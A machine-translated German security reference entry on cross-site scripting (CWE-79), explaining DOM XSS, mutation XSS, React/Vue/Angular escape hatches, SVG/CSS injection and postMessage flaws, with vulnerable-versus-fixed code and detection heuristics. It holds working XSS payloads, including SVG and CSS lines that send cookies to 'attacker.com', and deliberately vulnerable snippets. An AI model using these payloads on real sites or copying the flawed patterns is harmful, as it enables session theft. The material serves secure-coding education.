---
description: "CWE-79: In HTML/DOM eingefügte, vom Angreifer kontrollierte Daten ohne Escaping. Vertiefungseintrag: DOM XSS, mXSS, Framework-Escape-Hatches, SVG/CSS-Injection, postMessage."
date: 2026-04-16
tags: [security, cwe, xss, dom-xss, mxss, javascript, react, vue, angular, frontend]
level: Advanced
source_sha256: f4dd9d13f0a734b151065503390ef7347a75ac5547fb788a963458148cde79f0
translation: machine
translated_at: '2026-10-24'
---
# CWE-79: Cross-Site Scripting (XSS) {#cwe-79-cross-site-scripting-xss}

**CWE-79** | OWASP Top 10 A03:2021 | Rang 1 in den CWE Top 25 (Vul-RAG Vertiefungseintrag)

## Funktionale Bedeutung {#functional-semantics}

XSS injiziert vom Angreifer kontrolliertes Skript in den Ausführungskontext des Browsers des Opfers und gewährt volle Same-Origin-Fähigkeiten: Cookie-Diebstahl, Session-Hijacking, Keylogging, DOM-Manipulation, Abgreifen von Zugangsdaten, Browser als Pivot. Drei Untertypen unterscheiden sich in Persistenz und Ausführungspfad, nicht in der Auswirkung:

- **Reflected** — Payload wird in der unmittelbaren Antwort zurückgegeben; das Opfer muss die Angreifer-URL aufrufen
- **Stored** — Payload wird persistiert (DB, Log, Profilfeld) und für andere Benutzer gerendert
- **DOM-based** — keine Serverbeteiligung; clientseitiges JS liest Angreifer-Daten aus URL/postMessage und schreibt sie ins DOM

Dieser Eintrag konzentriert sich auf nicht-triviale Vektoren: DOM XSS, Mutation XSS, Framework-Escape-Hatches, SVG/CSS-Injection und postMessage-Angriffe.

## Ursache {#root-cause}

Der HTML-Parser des Browsers unterscheidet nicht zwischen Markup der Anwendung und Markup aus Benutzerdaten. Jede vom Benutzer kontrollierte Zeichenkette, die ohne kontextbezogenes Escaping in einen HTML-Kontext eingefügt wird, wird ausführbar.

Drei Fehlerarten:
1. **Fehlendes Escaping** — Rohstring wird in HTML interpoliert
2. **Falsches Escaping** — HTML-escapter String wird im JavaScript-Kontext platziert (JS erfordert JS-String-Escaping, nicht `&amp;`)
3. **Umgehung des Escapings** — Benutzereingabe durchläuft eine Transformation, die ausführbare Syntax wieder einführt (Mutation XSS)

## DOM-basiertes XSS {#dom-based-xss}

Kein Server-Reflektieren erforderlich. Die Quelle ist eine Browser-API; die Senke ist eine DOM-Manipulationsfunktion.

**Quellen** (vom Angreifer kontrollierte DOM-Daten):
- `location.hash`, `location.search`, `location.href`
- `document.referrer`
- `window.name`
- `postMessage`-Daten
- `localStorage`/`sessionStorage`, falls zuvor vergiftet
- `document.cookie` (falls die App ein Cookie aus einem URL-Parameter schreibt)

**Senken** (Codeausführung bei Zuweisung):
- `element.innerHTML = ...`
- `element.outerHTML = ...`
- `document.write(...)`
- `document.writeln(...)`
- `eval(...)`, `new Function(...)`
- `setTimeout("string")`, `setInterval("string")`
- `element.insertAdjacentHTML(...)`
- `DOMParser.parseFromString(..., "text/html")` mit anschließendem Einfügen
- jQuery: `$(selector).html(...)`, `$.parseHTML()`

```javascript
// VULNERABLE: source = location.hash, sink = innerHTML
// Attack URL: https://example.com/page#<img src=x onerror=alert(1)>
const param = decodeURIComponent(location.hash.slice(1));
document.getElementById("welcome").innerHTML = "Hello " + param;

// VULNERABLE: source = postMessage, sink = innerHTML (no origin check)
window.addEventListener("message", (e) => {
    document.getElementById("content").innerHTML = e.data.html;
});

// VULNERABLE: source = URL param, sink = eval
const fn = new URLSearchParams(location.search).get("callback");
eval(fn + "()"); // attacker: ?callback=alert(document.cookie)
```

```javascript
// FIXED: DOM XSS — use textContent (no HTML parsing) for text; DOMPurify for HTML
const param = decodeURIComponent(location.hash.slice(1));
document.getElementById("welcome").textContent = "Hello " + param; // safe

// FIXED: postMessage with origin validation and sanitization
window.addEventListener("message", (e) => {
    if (e.origin !== "https://trusted-partner.com") return;
    const clean = DOMPurify.sanitize(e.data.html); // allowlist-based sanitization
    document.getElementById("content").innerHTML = clean;
});
```

## Mutation XSS (mXSS) {#mutation-xss-mxss}

mXSS tritt auf, wenn ein bereinigter String vom HTML-Parser des Browsers erneut geparst wird und die Mutation ausführbares Markup erzeugt. Der Sanitizer sieht sicheres HTML; nach dem Einfügen und erneuten Parsen rekonstruiert der Browser ein anderes, ausführbares DOM.

**Klassischer mXSS-Vektor — Namespace-Verwechslung:**

```html
<!-- Input after DOMPurify (old versions): appears safe -->
<svg><p id="<img src=x onerror=alert(1)>"></p></svg>

<!-- Browser re-parses and extracts img from SVG namespace context:
     The parser's state machine treats the SVG content differently,
     causing the id attribute content to become an img element -->
```

**noscript-mXSS:**
```html
<!-- When JS is enabled, <noscript> content is not parsed as HTML.
     Sanitizer parses without JS → sees text node inside noscript → passes.
     Browser with JS enabled → parses noscript differently in some contexts. -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

**Gegenmaßnahme:** Sanitization-Bibliotheken aktuell halten (DOMPurify 3.x hat viele mXSS-Vektoren behoben). Sanitization zum Zeitpunkt des Einfügens anwenden (`innerHTML = DOMPurify.sanitize(html)`), nicht zum Zeitpunkt der Speicherung — Sanitization beim Speichern wird durch Bibliotheksupdates ungültig.

## Framework-Escape-Hatches {#framework-escape-hatches}

Frameworks bieten sichere Standardeinstellungen, stellen aber explizite Umgehungen für als „legitim“ betrachtetes HTML-Einfügen bereit.

### React — dangerouslySetInnerHTML {#react-dangerouslysetinnerhtml}

```jsx
// VULNERABLE: user-controlled description rendered as HTML
function PostBody({ post }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: post.description }} />
    );
}

// FIXED: sanitize before insertion
import DOMPurify from "dompurify";

function PostBody({ post }) {
    const clean = DOMPurify.sanitize(post.description, {
        ALLOWED_TAGS: ["p", "b", "i", "a", "ul", "li"],
        ALLOWED_ATTR: ["href", "target"]
    });
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**React-spezifischer Hinweis:** JSX-Interpolation `{}` escaped immer — `<div>{userInput}</div>` ist sicher. Nur `dangerouslySetInnerHTML` und `javascript:`-hrefs sind Senken.

```jsx
// VULNERABLE: javascript: href
function Link({ url }) {
    return <a href={url}>Click</a>; // attacker: url = "javascript:alert(1)"
}

// FIXED: validate URL scheme
function Link({ url }) {
    const safe = /^https?:\/\//.test(url) ? url : "#";
    return <a href={safe}>Click</a>;
}
```

### Vue — v-html {#vue-v-html}

```vue
<!-- VULNERABLE: v-html renders raw HTML -->
<template>
    <div v-html="userComment"></div>
</template>

<!-- FIXED: sanitize in computed property -->
<template>
    <div v-html="sanitizedComment"></div>
</template>

<script>
import DOMPurify from "dompurify";
export default {
    computed: {
        sanitizedComment() {
            return DOMPurify.sanitize(this.userComment);
        }
    }
}
</script>
```

### Angular — bypassSecurityTrust* {#angular-bypasssecuritytrust}

```typescript
// VULNERABLE: bypasses Angular's sanitization
import { DomSanitizer } from "@angular/platform-browser";

@Component({
    template: `<div [innerHTML]="trustedHtml"></div>`
})
export class ContentComponent {
    trustedHtml: SafeHtml;

    constructor(private sanitizer: DomSanitizer) {
        // bypassSecurityTrustHtml tells Angular not to sanitize
        this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(
            this.userInput // VULNERABLE if userInput is attacker-controlled
        );
    }
}

// FIXED: use Angular's built-in sanitization (default [innerHTML] behavior)
@Component({
    template: `<div [innerHTML]="userInput"></div>` // Angular sanitizes automatically
})
export class ContentComponent {
    userInput: string; // Angular's DomSanitizer strips script tags by default
}
```

## SVG- und MathML-Injection {#svg-and-mathml-injection}

SVG ist gültiges HTML5 und führt Skript im selben Origin aus, wenn es eingebettet wird:

```html
<!-- Stored as profile avatar URL or in rich text -->
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
</svg>

<!-- SVG event handlers — no <script> tag needed -->
<svg onload="fetch('https://attacker.com/?c='+document.cookie)">
    <animate attributeName="x" values="0;1" onbegin="eval(atob('YWxlcnQoMSk='))"/>
</svg>

<!-- MathML -->
<math><mtext><![CDATA[</mtext><script>alert(1)</script>]]></mtext></math>
```

**Erkennung:** Datei-Upload-Handler, die SVG akzeptieren, ohne `<script>` und Event-Handler zu entfernen. Content-Type-Sniffing durch Browser, wenn der Server SVG als `text/plain` oder `application/octet-stream` ohne `X-Content-Type-Options: nosniff` ausliefert.

**Behebung:** Entweder SVG-Uploads ablehnen oder mit einem Parser bereinigen, der Skriptinhalte entfernt (DOMPurify behandelt SVG; serverseitig: `svgo` mit Plugin `removeScripts`).

## CSS-Injection {#css-injection}

CSS-Injection hat einen geringeren Schweregrad als Skript-Injection, ist aber dennoch ausnutzbar:

```html
<!-- Style injection via unescaped CSS value -->
<style>
    .user-theme { color: {{ userColor }}; }
</style>
<!-- attacker input: red; } body { background: url('//attacker.com/?c='+document.cookie+'; .x { -->
```

**Auswirkungen von CSS-Injection:**
- Daten exfiltrieren über `background: url()` oder `font-face src` (CSS-Exfiltration)
- UI-Redressing / Clickjacking-Overlay
- Von `expression()` (IE-Legacy) ausgeführtes JS
- CSS-`@import` einer externen Stylesheet-Datei

**Behebung:** Benutzerdaten niemals in `<style>`-Blöcke oder `style=`-Attribute interpolieren. CSS-Custom-Properties mit validierten Werten verwenden.

## PostMessage ohne Origin-Prüfung {#postmessage-without-origin-check}

```javascript
// VULNERABLE: any window can send messages
window.addEventListener("message", (event) => {
    // Missing: if (event.origin !== "https://trusted.com") return;
    document.getElementById("panel").innerHTML = event.data;
});

// FIXED: strict origin allowlist
const ALLOWED_ORIGINS = new Set(["https://app.example.com", "https://widget.example.com"]);

window.addEventListener("message", (event) => {
    if (!ALLOWED_ORIGINS.has(event.origin)) return;
    // Also validate structure — event.data could be any type
    if (typeof event.data !== "object" || !event.data.type) return;
    handleMessage(event.data);
});
```

## Kontextspezifische Escaping-Anforderungen {#context-specific-escaping-requirements}

| Einfügekontext | Erforderliches Escaping | Falscher Ansatz |
|---|---|---|
| HTML-Body-Inhalt | HTML-Entity-Encoding (`&lt;`, `&gt;`, `&amp;`, `&quot;`) | Keiner |
| HTML-Attributwert | HTML-Entity-Encoding + Attribut in Anführungszeichen | Nur HTML-Encoding (ungequotete Attribute) |
| JavaScript-String | JS-String-Escaping (`\`, `"`, `'`, `\n`, `\r`) | HTML-Entity-Encoding |
| JavaScript-Template-Literal | JS-Escaping + Escaping von Backtick/`${` | HTML-Entity-Encoding |
| CSS-Wert | CSS-Hex-Encoding | HTML-Entity-Encoding |
| URL-Parameter | `encodeURIComponent()` | HTML-Entity-Encoding |
| JSON in `<script>` | `</` → `<\/`, `<!--` → `<\!--` | Nur Standard-JSON |

## Erkennungsheuristiken {#detection-heuristics}

**Trigger für statische Analyse:**
- `innerHTML`, `outerHTML`, `insertAdjacentHTML` mit nicht-konstanter rechter Seite
- `document.write(`, `document.writeln(` mit variablen Argumenten
- `eval(`, `new Function(`, `setTimeout(string`, `setInterval(string`
- `dangerouslySetInnerHTML={{ __html: expr }}`, wobei expr kein Literal ist
- `v-html="expr"`, wobei expr in einer Computed Property nicht bereinigt wird
- `bypassSecurityTrustHtml(`, `bypassSecurityTrustScript(`, `bypassSecurityTrustUrl(`
- `window.addEventListener("message", ...)` ohne Origin-Prüfung
- jQuery: `.html(expr)`, `.append(expr)`, wobei expr aus Benutzerdaten stammt

**Trigger für Datenflussanalyse:**
- `location.hash`, `location.search`, `document.referrer` fließen ohne Escaping in DOM-Senken
- `postMessage`-`event.data` fließt in `innerHTML`
- Datenbankstring aus einer API-Antwort fließt clientseitig in `innerHTML`

**Indikatoren für Fehlalarme:**
- `innerHTML` wird im Quellcode auf ein String-Literal gesetzt (kein Datenfluss aus Benutzerdaten)
- `dangerouslySetInnerHTML` verarbeitet die Ausgabe von `DOMPurify.sanitize` mit einer strikten Allowlist
- Markdown-Renderer, der vorbereitetes HTML mit einer gepflegten Allowlist ausgibt (z. B. `marked` + `sanitize-html`)
- `eval()` angewendet auf eine JSON-Antwort der eigenen API über HTTPS — geringeres Risiko, aber dennoch meldenswert (stattdessen `JSON.parse` verwenden)

## Fallstricke {#gotchas}

- **Sanitization zur Speicher- vs. Renderzeit:** Wer Eingaben beim Empfang bereinigt und das bereinigte HTML speichert, friert die Version des Sanitizers ein. Eine später entdeckte Umgehung im Sanitizer betrifft dann alle historischen Inhalte. Sanitization sollte zur Renderzeit mit der aktuellen Bibliotheksversion erfolgen.
- **Trusted Types (Browser-API):** Die Trusted-Types-API von Chrome erzwingt, dass nur bestimmte „Policies“ Werte an `innerHTML` zuweisen können. Wirksame Defense-in-Depth; Konfiguration über `Content-Security-Policy: require-trusted-types-for 'script'`. Ersetzt keine Eingabe-Sanitization.
- **CSP ist keine primäre Lösung:** `Content-Security-Policy: script-src 'self'` verhindert viele XSS-Angriffe, lässt sich aber umgehen über JSONP-Endpunkte auf erlaubten Origins, Angulars `$compile` und CDN-gehostete Bibliotheken. CSP als Defense-in-Depth einsetzen, nicht als primäre Kontrolle.
- **`javascript:`-URIs in href/src/action:** HTML-Escaping einer URL verhindert nicht, dass `javascript:alert(1)` als ausführbarer href wirkt. Das Schema separat validieren (`/^https?:/`).
- **DOM-Clobbering:** HTML-Elemente mit `id`- oder `name`-Attributen überschatten globale JavaScript-Variablen. `<img id="document">` kann `document.forms` überschatten und so Pfade für Prototype Pollution eröffnen. `id`- und `name`-Attribute in nicht vertrauenswürdigem HTML bereinigen.
- **Template-Injection in serverseitigen Templates vs. clientseitiges XSS:** Jinja2 `{{ user_input }}` mit Auto-Escaping ist für HTML sicher, wird aber verwundbar, wenn user_input in ein ungeschütztes `{{ user_input | safe }}` gelangt. Das ist SSTI (CWE-1336), nicht XSS, hat aber Remote Code Execution als Auswirkung.

## Siehe auch {#see-also}

- CWE-116: Improper Encoding — Ursache: fehlerhaftes oder fehlendes Output-Encoding
- CWE-352: Csrf — häufig kombiniert: XSS umgeht CSRF-Tokens, die in JavaScript-zugänglichen Speicherorten liegen
- CWE-1336: Template Injection — serverseitiges Pendant; ähnlicher Datenfluss, höhere Auswirkung (RCE)
- CWE-601: Open Redirect — wird oft verkettet: Weiterleitung auf die Seite, die den XSS-Payload ausliefert
